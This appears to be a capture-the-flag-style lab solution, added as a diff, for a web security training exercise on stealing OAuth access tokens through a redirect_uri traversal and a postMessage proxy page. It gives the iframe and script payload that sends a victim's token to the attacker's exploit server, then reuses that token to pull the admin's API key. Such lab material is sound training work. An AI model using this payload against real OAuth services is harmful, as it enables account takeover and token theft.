@@ -1,0 +1,55 @@
+// Lab: Stealing OAuth access tokens via a proxy page
+
+
+This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
+
+To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
+
+The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
+
+You can log in via your own social media account using the following credentials: wiener:peter.
+
+
+
+// Solution:
+
+
+1. Intercept the 2 Request and send it to Repeater.
+
+. GET /me HTTP/1.1
+
+. GET /auth?client_id=e38varl0nrptlk36n6vqp&redirect_uri=https://0a45003604b8b6f180af03ce00d80081.web-security-academy.net/oauth-callback&response_type=token&nonce=-1221454162&scope=openid%20profile%20email HTTP/2
+
+
+
+
+2. Use this payload to steal the admin's access token:
+
+<iframe src="https://oauth-0a6c005d04d8b66180d2012b02180099.oauth-server.net/auth?client_id=e38varl0nrptlk36n6vqp&redirect_uri=https://0a45003604b8b6f180af03ce00d80081.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1221454162&scope=openid%20profile%20email"></iframe> 
+
+
+<script>
+window.addEventListener('message', function(e) {
+    fetch("/" + encodeURIComponent(e.data.data))
+}, false)
+</script>
+
+
+
+3. Inject the above payload into the body section of Exploit server and deliver it to the Victim.
+
+
+4. Use the access log to see the victim's access token and copy it.
+
+
+5. Replace the access token in the saved `/me` request and send it to the server to get the admin's API key.
+
+6. Submit the API key to solve the lab.
+
+
+
+
+Take the reference from this video:
+
+https://www.youtube.com/watch?v=N6B7ieyN6ks
+
